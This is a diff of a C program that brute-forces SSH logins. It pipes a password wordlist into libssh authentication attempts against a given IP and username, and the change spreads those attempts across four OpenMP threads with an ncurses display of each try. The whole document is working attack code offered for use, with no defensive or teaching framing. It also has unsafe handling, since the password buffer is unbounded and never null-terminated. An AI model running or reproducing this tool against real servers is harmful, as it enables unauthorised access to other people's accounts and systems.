@@ -8,67 +8,76 @@ int main(int argc, char **argv)
 {
 	if(argc < 3)
 	{
-		printf("cat wordlist |./sshash ip username");
+		printf("cat wordlist |./sshash ip username\n");
 		exit(-1);
 	}
 	initscr();
 	cbreak();
 	noecho();
-	int port = 22;
-	char pass[128];
 	
 	ssh_init();
-
-	char c;
-	int scroll;
 	
-	#pragma omp taskloop firstprivate(pass, c, scroll)
+	int nt = 4;
+	
+	ssh_session SSH[nt];
+	
 	for(long int X=0; X<0xffffffff; ++X)
 	{
-		int rc;
-		ssh_session SSH;
-		if(X % 6 == 0)
-		{	
-			if(X != 0)
-			{
-				ssh_disconnect(SSH);
-				ssh_free(SSH);
+		#pragma omp parallel for
+		for(int x=0; x<nt; ++x)
+		{
+			char pass[128];
+			
+			char c;
+			int scroll;
+			if(X % 6 == 0)//every 6 attempts
+			{	
+				if(X != 0)//but for the first
+				{
+					ssh_disconnect(SSH[x]);
+					ssh_free(SSH[x]);
+				}	
+				SSH[x] = ssh_new();
+	
+				ssh_options_set(SSH[x], SSH_OPTIONS_HOST, argv[1]);
+				ssh_options_set(SSH[x], SSH_OPTIONS_USER, argv[2]);
+	
+				if(ssh_connect(SSH[x]) != 0)
+				{
+					endwin();
+					printf("%s\n", ssh_get_error(SSH[x]));
+					exit(-1);
+				}
 			}
-			SSH = ssh_new();
-	
-			ssh_options_set(SSH, SSH_OPTIONS_HOST, argv[1]);
-			ssh_options_set(SSH, SSH_OPTIONS_USER, argv[2]);
-	
-			if(ssh_connect(SSH) != 0)
+			scroll = 0;
+			#pragma omp critical
+			while(1)
+			{
+				fread(&c, 1, 1, stdin);
+				if(c == '\n') break;
+				pass[scroll] = c;
+				++scroll;
+			}
+			if(ssh_userauth_password(SSH[x], NULL, pass) != SSH_AUTH_SUCCESS)
+			{
+				#pragma omp critical
+				{
+					mvprintw(0, 0, "Try %d:%s:%s:%s\n", (X+1)*nt-1, argv[1], argv[2], pass);
+					refresh();
+				}
+				continue;
+			}
+			else
 			{
 				endwin();
-				printf("%s\n", ssh_get_error(SSH));
-				exit(-1);
+				printf("Password is %s\n", pass);
+				ssh_disconnect(SSH[x]);
+				ssh_free(SSH[x]);
+				X = 0xffffffffe;//break
 			}
 		}
-		scroll = 0;
-		while(1)
-		{
-			read(0, &c, 1);
-			if(c == '\n') break;
-			pass[scroll] = c;
-			++scroll;
-		}	
-		rc = ssh_userauth_password(SSH, NULL, pass);
-		if(rc != SSH_AUTH_SUCCESS)
-		{
-			mvprintw(0, 0, "%s:%s:%s\n", argv[1], argv[2], pass);
-			refresh();
-			continue;
-		}
-		else
-		{
-			endwin();
-			printf("Password is %s\n", pass);
-			ssh_disconnect(SSH);
-			ssh_free(SSH);
-			#pragma omp critical
-			X = 0xffffffffe;
-		}
+		//end ncurses graciously
+		#pragma omp critical
+		endwin();
 	}
 }
